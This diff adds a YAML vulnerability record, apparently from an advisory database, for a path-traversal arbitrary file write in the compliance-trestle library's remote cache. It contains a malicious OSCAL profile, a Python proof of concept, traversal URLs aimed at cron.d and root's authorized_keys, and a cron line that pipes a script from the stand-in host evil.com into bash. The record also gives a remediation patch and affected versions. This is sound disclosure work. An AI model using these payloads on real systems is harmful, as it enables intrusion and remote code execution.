@@ -1,0 +1,364 @@
+advisory_id: GHSA-g3vg-vx23-3858
+datasource_id: github_osv/GHSA-g3vg-vx23-3858
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g3vg-vx23-3858/GHSA-g3vg-vx23-3858.json
+aliases:
+  - CVE-2026-45725
+summary: |
+  compliance-trestle Remote Fetching Mechanism has an Arbitrary File Write via Cache Path Traversal
+  ## Summary
+
+  The compliance-trestle library's remote fetching cache mechanism (HTTPSFetcher and SFTPFetcher) constructs the local cache file path from the URL path component without sanitizing path traversal sequences (`../`). When a remote OSCAL profile references a URL with traversal in its path, the HTTP response body is written to a location **outside the intended cache directory**, enabling **arbitrary file write with attacker-controlled content** to the filesystem.
+
+  **Attack chain:** Malicious OSCAL profile → HTTPS fetch → cache path traversal → arbitrary file write → RCE (via cron, SSH keys, etc.)
+
+  ## Affected Component
+
+  **Repository:** https://github.com/IBM/compliance-trestle
+  **File:** `trestle/core/remote/cache.py` (lines 259-266 for HTTPSFetcher, lines 328-333 for SFTPFetcher)
+  **Version:** v4.0.2 (latest as of 2026-04-30)
+  ## Vulnerable Code
+
+  ### cache.py:259-266 — HTTPSFetcher cache path construction
+
+  ```python
+  class HTTPSFetcher(FetcherBase):
+      def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
+          # ...
+          u = parse.urlparse(self._uri)
+          # ...
+          if u.hostname is None:
+              raise TrestleError(f'Cache request for {self._uri} requires hostname')
+          https_cached_dir = self._trestle_cache_path / u.hostname
+          # ❌ path_parent preserves ../ sequences from URL
+          path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
+          https_cached_dir = https_cached_dir / path_parent
+          https_cached_dir.mkdir(parents=True, exist_ok=True)  # ❌ Creates dirs outside cache
+          self._cached_object_path = https_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
+  ```
+
+  ### cache.py:285-295 — Content written to traversed path
+
+  ```python
+      def _do_fetch(self) -> None:
+          # ...
+          response = requests.get(self._url, auth=auth, verify=verify, timeout=30)
+          if response.status_code == 200:
+              result = response.text  # ❌ Attacker-controlled content
+              self._cached_object_path.write_text(result)  # ❌ Written to arbitrary path
+  ```
+
+  ### cache.py:328-333 — SFTPFetcher (identical pattern)
+
+  ```python
+  class SFTPFetcher(FetcherBase):
+      def __init__(self, ...):
+          # Identical path construction — same vulnerability
+          sftp_cached_dir = self._trestle_cache_path / u.hostname
+          path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
+          sftp_cached_dir = sftp_cached_dir / path_parent
+          sftp_cached_dir.mkdir(parents=True, exist_ok=True)
+          self._cached_object_path = sftp_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
+  ```
+
+  **Root Cause:**
+  1. `urlparse("https://evil.com/../../../tmp/pwned.json").path` = `/../../../tmp/pwned.json` — preserves `../`
+  2. `pathlib.Path(u.path).parent` preserves traversal sequences
+  3. `cache_dir / hostname / "../../../../../../tmp"` resolves outside cache
+  4. `mkdir(parents=True, exist_ok=True)` creates intermediate directories
+  5. `write_text(response.text)` writes attacker-controlled content to traversed path
+  6. **No `is_relative_to()` boundary check** on the resolved path
+
+
+  ## Steps to Reproduce
+
+  ### Prerequisites
+
+  ```bash
+  pip install compliance-trestle==4.0.2
+  ```
+
+  ### PoC: Malicious OSCAL Profile
+
+  ```yaml
+  # malicious_profile.yaml — arbitrary file write via cache traversal
+  profile:
+    uuid: "550e8400-e29b-41d4-a716-446655440000"
+    metadata:
+      title: "Malicious Profile"
+      version: "1.0"
+      last-modified: "2024-01-01T00:00:00+00:00"
+      oscal-version: "1.0.4"
+    imports:
+      - href: "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
+  ```
+
+  ### PoC: Cache Path Traversal Simulation
+
+  ```python
+  #!/usr/bin/env python3
+  """PoC: Cache path traversal → arbitrary file write"""
+  import os, re, tempfile, shutil
+  from pathlib import Path
+  from urllib.parse import urlparse
+
+  # Simulate trestle cache behavior (cache.py:259-266)
+  trestle_root = Path(tempfile.mkdtemp(prefix="trestle_poc_"))
+  cache_dir = trestle_root / ".trestle" / ".cache"
+  cache_dir.mkdir(parents=True, exist_ok=True)
+
+  evil_url = "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
+  u = urlparse(evil_url)
+
+  # Exact trestle code path
+  cached_dir = cache_dir / u.hostname
+  m = re.search(r'[^/\\\\]', u.path)
+  path_parent = Path(u.path[m.span()[0]:]).parent
+  cached_dir = cached_dir / path_parent
+  cached_dir.mkdir(parents=True, exist_ok=True)
+  cached_file = cached_dir / Path(Path(u.path).name)
+
+  print(f"Cache dir: {cache_dir}")
+  print(f"Resolved write target: {cached_file.resolve()}")
+  # Output: /tmp/trestle_pwned.json ← OUTSIDE cache directory!
+
+  # Write attacker content
+  attacker_payload = '*/5 * * * * root /bin/bash -c "id > /tmp/rce_proof"'
+  cached_file.write_text(attacker_payload)
+  print(f"Written: {cached_file.resolve().read_text()}")
+
+  # Cleanup
+  os.remove(str(cached_file.resolve()))
+  shutil.rmtree(str(trestle_root))
+  ```
+
+  **Expected:** Write confined to `.trestle/.cache/` directory
+  **Actual:** File written to `/tmp/trestle_pwned.json` (arbitrary filesystem location)
+
+
+  ## Remediation
+
+  ### Fix for HTTPSFetcher (cache.py:259-266):
+
+  ```python
+  class HTTPSFetcher(FetcherBase):
+      def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
+          # ...
+          u = parse.urlparse(self._uri)
+          https_cached_dir = self._trestle_cache_path / u.hostname
+
+          # ✅ Sanitize path: remove traversal sequences
+          safe_path = pathlib.PurePosixPath(u.path).parts
+          safe_path = [p for p in safe_path if p != '..' and p != '/']
+          path_parent = pathlib.Path(*safe_path[:-1]) if len(safe_path) > 1 else pathlib.Path('.')
+
+          https_cached_dir = https_cached_dir / path_parent
+          https_cached_dir.mkdir(parents=True, exist_ok=True)
+          self._cached_object_path = https_cached_dir / safe_path[-1]
+
+          # ✅ Boundary check
+          if not self._cached_object_path.resolve().is_relative_to(self._trestle_cache_path.resolve()):
+              raise TrestleError(
+                  f"Cache path traversal blocked: URL '{uri}' resolves to "
+                  f"'{self._cached_object_path.resolve()}' outside cache directory"
+              )
+  ```
+
+  Same fix required for SFTPFetcher at lines 328-333.
+
+  ## References
+
+  - **CWE-22:** https://cwe.mitre.org/data/definitions/22.html
+  - **CWE-73:** https://cwe.mitre.org/data/definitions/73.html
+  - **compliance-trestle:** https://github.com/IBM/compliance-trestle
+
+  ## Impact
+
+  ### 1. Cron Job Injection → Remote Code Execution
+
+  ```yaml
+  # Profile that writes a cron job
+  imports:
+    - href: "https://evil.com/../../../../../../../etc/cron.d/backdoor"
+  ```
+
+  Attacker's server responds with:
+  ```
+  * * * * * root /bin/bash -c 'curl https://evil.com/shell.sh | bash'
+  ```
+
+  ### 2. SSH Authorized Keys Injection
+
+  ```yaml
+  imports:
+    - href: "https://evil.com/../../../../../../../root/.ssh/authorized_keys"
+  ```
+
+  Attacker's server responds with their SSH public key.
+
+  ### 3. Config File Overwrite
+
+  ```yaml
+  imports:
+    - href: "https://evil.com/../../../../../../../etc/nginx/conf.d/evil.conf"
+  ```
+
+  ### 4. Python Path Hijacking
+
+  Write malicious `.py` file to a location on `sys.path` for code execution on next import.
+impacted_packages:
+  - purl: pkg:pypi/compliance-trestle
+    affected_versions: vers:pypi/>=4.0.0|<=4.0.2
+    fixed_versions: vers:pypi/4.0.3
+    affected_packages:
+      - pkg:pypi/compliance-trestle@4.0.0
+      - pkg:pypi/compliance-trestle@4.0.1
+      - pkg:pypi/compliance-trestle@4.0.2
+    fixed_packages:
+      - pkg:pypi/compliance-trestle@4.0.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:pypi/compliance-trestle
+    affected_versions: vers:pypi/<3.12.2
+    fixed_versions: vers:pypi/3.12.2
+    affected_packages:
+      - pkg:pypi/compliance-trestle@0.0.2
+      - pkg:pypi/compliance-trestle@0.0.3
+      - pkg:pypi/compliance-trestle@0.1.0
+      - pkg:pypi/compliance-trestle@0.1.1
+      - pkg:pypi/compliance-trestle@0.2.0
+      - pkg:pypi/compliance-trestle@0.2.1
+      - pkg:pypi/compliance-trestle@0.2.2
+      - pkg:pypi/compliance-trestle@0.3.0
+      - pkg:pypi/compliance-trestle@0.4.0
+      - pkg:pypi/compliance-trestle@0.5.0
+      - pkg:pypi/compliance-trestle@0.6.0
+      - pkg:pypi/compliance-trestle@0.6.1
+      - pkg:pypi/compliance-trestle@0.6.2
+      - pkg:pypi/compliance-trestle@0.7.0
+      - pkg:pypi/compliance-trestle@0.7.1
+      - pkg:pypi/compliance-trestle@0.7.2
+      - pkg:pypi/compliance-trestle@0.8.0
+      - pkg:pypi/compliance-trestle@0.8.1
+      - pkg:pypi/compliance-trestle@0.9.0
+      - pkg:pypi/compliance-trestle@0.10.0
+      - pkg:pypi/compliance-trestle@0.11.0
+      - pkg:pypi/compliance-trestle@0.12.0
+      - pkg:pypi/compliance-trestle@0.13.0
+      - pkg:pypi/compliance-trestle@0.13.1
+      - pkg:pypi/compliance-trestle@0.14.0
+      - pkg:pypi/compliance-trestle@0.14.1
+      - pkg:pypi/compliance-trestle@0.14.2
+      - pkg:pypi/compliance-trestle@0.14.3
+      - pkg:pypi/compliance-trestle@0.14.4
+      - pkg:pypi/compliance-trestle@0.15.0
+      - pkg:pypi/compliance-trestle@0.15.1
+      - pkg:pypi/compliance-trestle@0.16.0
+      - pkg:pypi/compliance-trestle@0.17.0
+      - pkg:pypi/compliance-trestle@0.18.0
+      - pkg:pypi/compliance-trestle@0.18.1
+      - pkg:pypi/compliance-trestle@0.19.0
+      - pkg:pypi/compliance-trestle@0.20.0
+      - pkg:pypi/compliance-trestle@0.21.0
+      - pkg:pypi/compliance-trestle@0.22.0
+      - pkg:pypi/compliance-trestle@0.22.1
+      - pkg:pypi/compliance-trestle@0.23.0
+      - pkg:pypi/compliance-trestle@0.24.0
+      - pkg:pypi/compliance-trestle@0.25.0
+      - pkg:pypi/compliance-trestle@0.25.1
+      - pkg:pypi/compliance-trestle@0.26.0
+      - pkg:pypi/compliance-trestle@0.27.0
+      - pkg:pypi/compliance-trestle@0.27.1
+      - pkg:pypi/compliance-trestle@0.27.2
+      - pkg:pypi/compliance-trestle@0.28.0
+      - pkg:pypi/compliance-trestle@0.28.1
+      - pkg:pypi/compliance-trestle@0.29.0
+      - pkg:pypi/compliance-trestle@0.30.0
+      - pkg:pypi/compliance-trestle@0.31.0
+      - pkg:pypi/compliance-trestle@0.32.0
+      - pkg:pypi/compliance-trestle@0.32.1
+      - pkg:pypi/compliance-trestle@0.33.0
+      - pkg:pypi/compliance-trestle@0.34.0
+      - pkg:pypi/compliance-trestle@0.35.0
+      - pkg:pypi/compliance-trestle@0.36.0
+      - pkg:pypi/compliance-trestle@0.37.0
+      - pkg:pypi/compliance-trestle@1.0.0rc0
+      - pkg:pypi/compliance-trestle@1.0.1
+      - pkg:pypi/compliance-trestle@1.0.2
+      - pkg:pypi/compliance-trestle@1.1.0
+      - pkg:pypi/compliance-trestle@1.2.0
+      - pkg:pypi/compliance-trestle@2.0.0
+      - pkg:pypi/compliance-trestle@2.1.0
+      - pkg:pypi/compliance-trestle@2.1.1
+      - pkg:pypi/compliance-trestle@2.2.0
+      - pkg:pypi/compliance-trestle@2.2.1
+      - pkg:pypi/compliance-trestle@2.3.0
+      - pkg:pypi/compliance-trestle@2.3.1
+      - pkg:pypi/compliance-trestle@2.4.0
+      - pkg:pypi/compliance-trestle@2.5.0
+      - pkg:pypi/compliance-trestle@2.5.1
+      - pkg:pypi/compliance-trestle@2.6.0
+      - pkg:pypi/compliance-trestle@2.6.1
+      - pkg:pypi/compliance-trestle@3.0.1
+      - pkg:pypi/compliance-trestle@3.1.0
+      - pkg:pypi/compliance-trestle@3.2.0
+      - pkg:pypi/compliance-trestle@3.3.0
+      - pkg:pypi/compliance-trestle@3.4.0
+      - pkg:pypi/compliance-trestle@3.5.0
+      - pkg:pypi/compliance-trestle@3.6.0
+      - pkg:pypi/compliance-trestle@3.7.0
+      - pkg:pypi/compliance-trestle@3.8.0
+      - pkg:pypi/compliance-trestle@3.8.1
+      - pkg:pypi/compliance-trestle@3.9.0
+      - pkg:pypi/compliance-trestle@3.9.1
+      - pkg:pypi/compliance-trestle@3.9.2
+      - pkg:pypi/compliance-trestle@3.9.3
+      - pkg:pypi/compliance-trestle@3.10.2
+      - pkg:pypi/compliance-trestle@3.10.3
+      - pkg:pypi/compliance-trestle@3.10.4
+      - pkg:pypi/compliance-trestle@3.11.0
+      - pkg:pypi/compliance-trestle@3.12.0
+      - pkg:pypi/compliance-trestle@3.12.1
+    fixed_packages:
+      - pkg:pypi/compliance-trestle@3.12.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/oscal-compass/compliance-trestle
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/oscal-compass/compliance-trestle
+        commit: 9abc492329fcc8d0557182317de9bde854385da3
+        patch_text:
+      - vcs_url: https://github.com/oscal-compass/compliance-trestle
+        commit: 89f4e53d159e8ff901da4d7c3b51c9556bd32ec0
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g3vg-vx23-3858/GHSA-g3vg-vx23-3858.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-73
+references:
+  - url: https://github.com/oscal-compass/compliance-trestle
+    reference_type:
+    reference_id:
+  - url: https://github.com/oscal-compass/compliance-trestle/commit/89f4e53d159e8ff901da4d7c3b51c9556bd32ec0
+    reference_type:
+    reference_id:
+  - url: https://github.com/oscal-compass/compliance-trestle/commit/9abc492329fcc8d0557182317de9bde854385da3
+    reference_type:
+    reference_id:
+  - url: https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-g3vg-vx23-3858
+    reference_type:
+    reference_id:
+exploits: []
